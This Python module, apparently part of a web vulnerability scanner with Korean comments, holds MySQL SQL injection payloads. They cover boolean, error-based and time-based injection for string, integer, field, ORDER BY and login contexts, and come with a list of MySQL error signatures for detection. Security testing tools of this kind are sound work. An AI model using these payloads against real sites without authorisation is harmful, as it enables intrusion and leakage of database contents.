from typing import Dict, List, Optional

# Dict values may include true_payload/false_payload (boolean pair) or payload (single)
Payload = Dict

_SLEEP = 5

STRENGTH_LIMIT = {
    "LOW":    5,
    "MEDIUM": 15,
    "HIGH":   40,
    "INSANE": 9999,
}

# MySQL/MariaDB 에러 시그니처 (MySQL 기준만 유지)
ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "xpath syntax error",
    "extractvalue(",
    "updatexml(",
    "duplicate entry",
    "column count doesn't match",
    "the used select statements have a different number",
    "supplied argument is not a valid mysql",
    "division by zero",
    "unknown column",
    "com.mysql.jdbc.exceptions",
    "org.gjt.mm.mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "mariadb server version",
    "table 'g5_",
]

# ── string_sq: WHERE col = 'INPUT' (싱글쿼트 문자열 컨텍스트) ──────
# Boolean pair: true_payload / false_payload 동일 family에 정의
BLIND_STRING_SQ: List[Payload] = [
    {
        "type": "BOOLEAN", "family": "and",
        "true_payload":  "{base}' AND '1'='1'-- -",
        "false_payload": "{base}' AND '1'='2'-- -",
    },
    {
        "type": "ERROR_BASED", "family": "extractvalue",
        "payload": "{base}' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
    },
    {
        "type": "ERROR_BASED", "family": "updatexml",
        "payload": "{base}' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -",
    },
    {
        "type": "TIME_BASED", "family": "sleep",
        "payload": f"{{base}}' AND SLEEP({_SLEEP})-- -",
    },
]

# ── integer: WHERE id = INPUT (숫자 컨텍스트) ────────────────────────
BLIND_INTEGER: List[Payload] = [
    {
        "type": "BOOLEAN", "family": "and",
        "true_payload":  "{base} AND 1=1-- -",
        "false_payload": "{base} AND 1=2-- -",
    },
    {
        "type": "ERROR_BASED", "family": "extractvalue",
        "payload": "{base} OR EXTRACTVALUE(1,CONCAT(0x7e,database()))",
    },
    {
        "type": "ERROR_BASED", "family": "updatexml",
        "payload": "{base} OR UPDATEXML(1,CONCAT(0x7e,database()),1)",
    },
    {
        "type": "TIME_BASED", "family": "sleep",
        "payload": f"{{base}} OR SLEEP({_SLEEP})",
    },
]

# ── field_selector: SELECT/WHERE 필드명 주입 ─────────────────────────
FIELD_SELECTOR: List[Payload] = [
    {
        "type": "SQLI_FIELD", "family": "bool",
        "true_payload":  "{base})AND(1=1)-- -",
        "false_payload": "{base})AND(1=2)-- -",
    },
    {
        "type": "ERROR_BASED", "family": "extractvalue",
        "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -",
    },
    {
        "type": "TIME_BASED", "family": "sleep",
        "payload": f"SLEEP({_SLEEP})-- -",
    },
]

# ── orderby: ORDER BY 절 주입 ────────────────────────────────────────
ORDERBY: List[Payload] = [
    {
        "type": "SQLI_ORDERBY", "family": "case",
        "true_payload":  "CASE WHEN (1=1) THEN {base} ELSE 2 END",
        "false_payload": "CASE WHEN (1=2) THEN {base} ELSE 2 END",
    },
    {
        "type": "ERROR_BASED", "family": "extractvalue",
        "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))",
    },
    {
        "type": "TIME_BASED", "family": "sleep",
        "payload": f"(SELECT SLEEP({_SLEEP}))",
    },
]

# ── auth: 로그인 폼 — 탐지(error/time)만, 인증 우회 제외 ─────────────
SQLI_LOGIN: List[Payload] = [
    {
        "type": "ERROR_BASED", "family": "extractvalue",
        "payload": "{base}' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
    },
    {
        "type": "ERROR_BASED", "family": "updatexml",
        "payload": "{base}' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -",
    },
    {
        "type": "TIME_BASED", "family": "sleep",
        "payload": f"{{base}}' AND SLEEP({_SLEEP})-- -",
    },
    {
        "type": "TIME_BASED", "family": "or_sleep",
        "payload": f"{{base}}' OR SLEEP({_SLEEP})-- -",
    },
]

# ── context 조회 맵 ──────────────────────────────────────────────────
_CONTEXT_MAP: Dict[str, List[Payload]] = {
    "string_sq":      BLIND_STRING_SQ,
    "integer":        BLIND_INTEGER,
    "field_selector": FIELD_SELECTOR,
    "field":          FIELD_SELECTOR,
    "orderby":        ORDERBY,
    "auth":           SQLI_LOGIN,
    "login":          SQLI_LOGIN,
}


# ── 헬퍼 ────────────────────────────────────────────────────────────

def match_error(response_body: str) -> Optional[str]:
    body_lower = response_body.lower()
    for pattern in ERROR_PATTERNS:
        if pattern.lower() in body_lower:
            return pattern
    return None


def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
    return payloads[: STRENGTH_LIMIT.get(strength.upper(), STRENGTH_LIMIT["MEDIUM"])]


def expand_pairs(payloads: List[Payload]) -> List[Payload]:
    """Pair dict(true_payload/false_payload)을 단건 payload 레코드로 펼친다.
    true 먼저, false 다음 순서로 삽입해 분석기가 비교군을 구성할 수 있게 한다.
    단건 레코드는 그대로 통과한다."""
    result: List[Payload] = []
    for p in payloads:
        if "true_payload" in p and "false_payload" in p:
            family = p.get("family") or ""
            result.append({
                "type":    p.get("type"),
                "family":  family + "_true",
                "payload": p["true_payload"],
            })
            result.append({
                "type":    p.get("type"),
                "family":  family + "_false",
                "payload": p["false_payload"],
            })
        else:
            result.append(p)
    return result


# ── 조회 함수 ────────────────────────────────────────────────────────

def get_by_sql_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
    """컨텍스트 이름으로 페이로드 반환 (강도 제한 적용). Boolean pair는 단건으로 전개."""
    pool = _CONTEXT_MAP.get(context.lower(), BLIND_STRING_SQ)
    return expand_pairs(_limit(pool, strength))


def get_blind_sqli(context: str) -> List[Payload]:
    """SQL 컨텍스트 타입 → 페이로드 리스트 반환. Boolean pair는 단건으로 전개."""
    return expand_pairs(_CONTEXT_MAP.get(context.lower(), []))


def get_all() -> List[Payload]:
    """중복 제거 후 전체 페이로드 반환. Boolean pair는 단건으로 전개."""
    seen: set = set()
    result: List[Payload] = []
    for pool in _CONTEXT_MAP.values():
        for item in pool:
            key = item.get("payload") or item.get("true_payload", "")
            if key and key not in seen:
                seen.add(key)
                result.append(item)
    return expand_pairs(result)
